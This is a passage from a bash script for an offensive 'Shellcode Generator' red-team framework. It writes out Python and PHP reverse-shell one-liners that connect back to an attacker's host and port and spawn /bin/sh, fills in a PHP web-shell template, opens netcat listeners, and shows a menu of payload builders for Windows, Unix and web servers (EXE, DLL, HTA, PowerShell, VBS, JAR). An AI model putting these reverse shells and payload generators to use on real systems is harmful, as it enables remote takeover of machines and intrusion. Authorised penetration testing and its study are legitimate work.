     echo "- https://highon.coffee/blog/reverse-shell-cheat-sheet/"
     echo "-"
     echo "- SHELL   : import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK"
     echo "-           _STREAM);s.connect(('$lhost',$lport));os.dup2(s.fileno(),0); os.dup2"
     echo "-           (s.fileno(),1);os.dup2(s.fileno(),2);p=subprocess.call(['/bin/sh','-i']);"
     echo "- EXECUTE : press twice in $N4m to execute!"
     echo "- NETCAT  : sudo nc -l -v $lhost $lport"
     echo "---"
     sleep 3
     zenity --title="☆ SYSTEM BUILD-IN SHELLS ☆" --text "Shell Stored Under:\n$IPATH/output/$N4m" --info > /dev/null 2>&1
     xterm -T "☆ NETCAT LISTENER ☆" -geometry 110x23 -e "sudo nc -l -v $lhost $lport"
     sleep 2


   else

     cd $IPATH/templates/
     N4m=$(zenity --title="☆ SHELL NAME ☆" --text "example: shell.php" --entry --width 330) > /dev/null 2>&1
     echo "[✔ ] Building -> simple php shell..."
     sed "s|IpAdDr|$lhost|" simple_shell.php > simple.raw
     sed "s|P0rT|$lport|" simple.raw > final.raw
     rm $IPATH/templates/simple.raw > /dev/null 2>&1
     mv final.raw $IPATH/output/$N4m > /dev/null 2>&1
     chmod +x $IPATH/output/$N4m > /dev/null 2>&1
     

     echo "---"
     echo "- simple php reverse shell that uses socket programming"
     echo "- https://highon.coffee/blog/reverse-shell-cheat-sheet/"
     echo "-"
     echo "- SHELL   : php -r 'sock=fsockopen('$lhost',$lport);exec('/bin/sh -i <&3 >&3 2>&3');'"
     echo "- EXECUTE : http://<webserver-url>/$N4m"
     echo "- NETCAT  : sudo nc -l -v $lhost $lport"
     echo "---"
     sleep 3
     zenity --title="☆ SYSTEM BUILD-IN SHELLS ☆" --text "Shell Stored Under:\n$IPATH/output/$N4m" --info > /dev/null 2>&1
     xterm -T "☆ NETCAT LISTENER ☆" -geometry 110x23 -e "sudo nc -l -v $lhost $lport"
     sleep 2

fi
cd $IPATH/
}





# ----------------------------
# Frequent Ask Questions (FAQ)
# ---------------------------- 
sh_FAQ () {
# using CAT to read doc and ZENITY to display it to user
cat $IPATH/bin/_readme_FAQ | zenity --title "☠ Frequent Ask Questions ☠" --text-info --width 600 --height 640 > /dev/null 2>&1
sleep 1
}





# ------------------------------------
# exit venom framework
# ------------------------------------
sh_exit () {
echo "[☠ ] Exit Shellcode Generator..."
echo "[_Codename:malicious_server]"
echo "☆ ☆ ☆ ☆ ☆ ☆ ☆ ☆ ☆ ☆ ☆ ☆ ☆ ☆"
sleep 1
if [ "$DiStR0" = "Kali" ]; then
/etc/init.d/postgresql stop | zenity --progress --pulsate --title "☠ PLEASE WAIT ☠" --text="Stop postgresql" --percentage=0 --auto-close --width 300 > /dev/null 2>&1
/etc/init.d/metasploit stop | zenity --progress --pulsate --title "☠ PLEASE WAIT ☠" --text="Stop metasploit" --percentage=0 --auto-close --width 300 > /dev/null 2>&1
/etc/init.d/apache2 stop | zenity --progress --pulsate --title "☠ PLEASE WAIT ☠" --text="Stop apache2 webserver" --percentage=0 --auto-close --width 300 > /dev/null 2>&1
else
/etc/init.d/metasploit stop | zenity --progress --pulsate --title "☠ PLEASE WAIT ☠" --text="Stop metasploit" --percentage=0 --auto-close --width 300 > /dev/null 2>&1
/etc/init.d/apache2 stop | zenity --progress --pulsate --title "☠ PLEASE WAIT ☠" --text="Stop apache2 webserver" --percentage=0 --auto-close --width 300 > /dev/null 2>&1
fi

cd $IPATH
cd ..
sudo chown -hR $user shell > /dev/null 2>&1
exit
}





# -----------------------------
# MAIN MENU SHELLCODE GENERATOR
# -----------------------------
# Loop forever
while :
do
clear
cat << !


          __    _ ______  ____   _  _____  ____    __  
         \  \  //|   ___||    \ | |/     \|    \  /  |
          \  \// |   ___||     \| ||     ||     \/   |
           \__/  |______||__/\____|\_____/|__/\__/|__|$ver
    +-----------------+-----------+------------+------------------+
    |  OPTIONS BUILD  | TARGET OS |   FORMAT   |  SAVE OUTPUT     |
    +-----------------+-----------+------------+------------------+
    |  1 - shellcode     unix         C             C             |
    |  2 - shellcode     windows      C             DLL           |
    |  3 - shellcode     windows      DLL           DLL           |
    |  4 - shellcode     windows      C             PYTHON/EXE    |
    |  5 - shellcode     windows      C             EXE           |
    |  6 - shellcode     windows      C             RUBY          |
    |  7 - shellcode     windows      MSIEXEC       MSI           |
    |  8 - shellcode     windows      POWERSHELL    BAT           |
    |  9 - shellcode     windows      HTA-PSH       HTA           |
    | 10 - shellcode     windows      PSH-CMD       PS1           |
    | 11 - shellcode     windows      PSH-CMD       BAT           |
    | 12 - shellcode     windows      VBS           VBS           |
    | 13 - shellcode     webserver    PHP           PHP/PHP       |
    | 14 - shellcode     multi OS     PYTHON        PYTHON        |
    | 15 - shellcode     multi OS     JAVA          JAR(RCE)      |
    | 16 - web_delivery  multi OS     PYTHON/PSH    PYTHON/BAT    |
    |                                                             |
    |  S - system build-in shells                                 |
    |  F - FAQ (frequent ask questions)                           |
    |  E - exit Shellcode Generator                               |
    +-------------------------------------------------------------+
                                                 SSA-RedTeam@2016_|


!
echo "[☠ ] Shellcode Generator"
sleep 1
echo -n "[➽ ] Chose Your Venom:"
read choice
case $choice in
1) sh_shellcode1 ;;
2) sh_shellcode2 ;;
3) sh_shellcode3 ;;
4) sh_shellcode4 ;;
5) sh_shellcode5 ;;
6) sh_shellcode6 ;;
7) sh_shellcode7 ;;
8) sh_shellcode8 ;;
9) sh_shellcode9 ;;
10) sh_shellcode10 ;;
11) sh_shellcode11 ;;
12) sh_shellcode12 ;;
13) sh_shellcode13 ;;
14) sh_shellcode14 ;;
15) sh_shellcode15 ;;
16) sh_web_delivery ;;
S) sh_buildin ;;
s) sh_buildin ;;
f) sh_FAQ ;;
F) sh_FAQ ;;
e) sh_exit ;;
E) sh_exit ;;
h) echo "[☠ ] nice try, read FAQ insted..."; sleep 2 ;;
*) echo "\"$choice\": is not a valid Option"; sleep 2 ;;
esac
done
